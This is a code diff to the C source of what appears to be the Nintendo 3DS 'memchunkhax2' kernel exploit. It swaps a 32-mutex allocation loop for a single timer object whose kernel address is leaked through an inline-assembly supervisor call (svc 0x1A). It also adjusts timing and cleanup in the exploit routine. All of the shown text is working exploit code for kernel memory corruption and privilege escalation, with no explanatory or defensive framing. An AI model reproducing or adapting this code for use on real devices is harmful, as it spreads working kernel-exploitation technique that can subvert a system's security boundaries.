@@ -52,11 +52,12 @@ static void allocate_thread(void* arg) {
     data->result = svcControlMemory(&data->addr, data->addr, 0, data->size, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE));
 }
 
-static Result __attribute__((naked)) svcCreateMutexKAddr(Handle* handle, bool initially_locked, u32* kaddr) {
+// Creates a timer and outputs its kernel object address (at ref count, not vtable pointer) from r2.
+static Result __attribute__((naked)) svcCreateTimerKAddr(Handle* timer, u8 reset_type, u32* kaddr) {
     asm volatile(
             "str r0, [sp, #-4]!\n"
             "str r2, [sp, #-4]!\n"
-            "svc 0x13\n"
+            "svc 0x1A\n"
             "ldr r3, [sp], #4\n"
             "str r2, [r3]\n"
             "ldr r3, [sp], #4\n"
@@ -64,6 +65,7 @@ static Result __attribute__((naked)) svcCreateMutexKAddr(Handle* handle, bool in
             "bx lr"
     );
 }
+
 
 // Executes exploit.
 void execute_memchunkhax2() {
@@ -76,8 +78,7 @@ void execute_memchunkhax2() {
     void* backup = malloc(PAGE_SIZE);
     u32 isolatedPage = 0;
     u32 isolatingPage = 0;
-    Handle handles[32] = {0};
-    int handlesCreated = 0;
+    Handle kObjHandle = 0;
     u32 kObjAddr = 0;
     Thread delayThread = NULL;
 
@@ -137,13 +138,9 @@ void execute_memchunkhax2() {
     // If next is not 0, it will continue to whatever is pointed to by it.
     // Even if this eventually reaches an end, it will continue decrementing the remaining size value.
     // This will roll over, and panic when it thinks that there is more memory to allocate than was available.
-    while(kObjAddr != SLAB_HEAP_VIRT + 0x3010) {
-        if(handlesCreated >= 32 || R_FAILED(svcCreateMutexKAddr(&handles[handlesCreated], 0, &kObjAddr))) {
-            printf("Failed to create KSynchronizationObject.\n");
-            goto cleanup;
-        }
-
-        handlesCreated++;
+    if(R_FAILED(svcCreateTimerKAddr(&kObjHandle, 0, &kObjAddr))) {
+        printf("Failed to create KSynchronizationObject.\n");
+        goto cleanup;
     }
 
     // Convert the object address to a value that will properly convert to a physical address during mapping.
@@ -185,7 +182,7 @@ void execute_memchunkhax2() {
 
     // Wait for memory mapping to complete.
     while(data->result == -1) {
-        svcSleepThread(10000);
+        svcSleepThread(1000000);
     }
 
     if(R_FAILED(data->result)) {
@@ -232,10 +229,8 @@ cleanup:
         free(data);
     }
 
-    if(handlesCreated > 0) {
-        for(int i = 0; i < handlesCreated; i++) {
-            svcCloseHandle(handles[i]);
-        }
+    if(kObjHandle != 0) {
+        svcCloseHandle(kObjHandle);
     }
 
     printf("Test value: %08X\n", (int) testVal);
